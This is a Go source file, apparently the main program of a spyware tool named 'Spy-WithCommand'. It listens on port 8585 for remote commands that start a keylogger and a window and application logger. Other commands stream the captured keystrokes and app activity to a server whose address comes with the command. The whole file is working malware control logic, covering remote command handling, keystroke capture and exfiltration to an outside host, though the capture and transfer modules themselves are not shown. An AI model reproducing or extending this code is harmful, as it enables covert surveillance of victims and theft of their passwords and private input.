package main

import (
	"fmt"
	"github.com/mhthrh/Spy-WithCommand/Application"
	"github.com/mhthrh/Spy-WithCommand/KeyBoard"
	"github.com/mhthrh/Spy-WithCommand/Transfer"
	"github.com/mhthrh/Spy-WithCommand/Utils/CryptoUtil"
	"github.com/mhthrh/Spy-WithCommand/Utils/NetUtil"
	"regexp"
	"strconv"
	"strings"
	"time"
)

var (
	key, app, cmd         = make(chan string, 1), make(chan string, 1), make(chan string, 1)
	start, start1, start2 = make(chan bool, 1), make(chan bool, 1), make(chan bool, 1)
	crypto                CryptoUtil.Crypto
)

func init() {
	crypto = *CryptoUtil.NewKey()
}
func main() {

	go NetUtil.Listener("0.0.0.0", 8585, cmd)

	for {
		select {
		case res := <-key:
			fmt.Println("0987654321")
			KeyBoard.CK <- KeyBoard.KeyBoard{
				Char:     res,
				DateTime: time.Now(),
			}
		case res := <-app:
			fmt.Println("1234567890")
			Application.CA <- Application.Application{
				App:      res,
				DateTime: time.Now(),
			}
		case res := <-cmd:
			reg, err := regexp.Compile("[^a-zA-Z0-9-:.]+")
			if err != nil {
				return
			}
			fmt.Println(res)
			cmdS := strings.Split(reg.ReplaceAllString(res, ""), "-")
			if cmdS[0] == "window" {
				if cmdS[1] == "start" {
					start <- true
					go Application.AppLogger(app, &start)
				} else {
					start <- false
				}
			}
			if cmdS[0] == "keyboard" {
				if cmdS[1] == "start" {
					start1 <- true
					go KeyBoard.KeyLogger(key, &start1)
				} else {
					start1 <- false
				}
			}
			if cmdS[0] == "transfer" {
				if cmdS[1] == "start" {
					start2 <- true

					i, err := strconv.ParseInt(strings.Split(cmdS[2], ":")[1], 10, 64)
					if err != nil {
						return
					}
					go Transfer.Send2Server(&Transfer.Transfer{
						Ip:   strings.Split(cmdS[2], ":")[0],
						Port: i,
						CA:   &Application.CA,
						CK:   &KeyBoard.CK,
					}, &start2)
				} else {
					start2 <- false
				}
			}
		}
	}
}
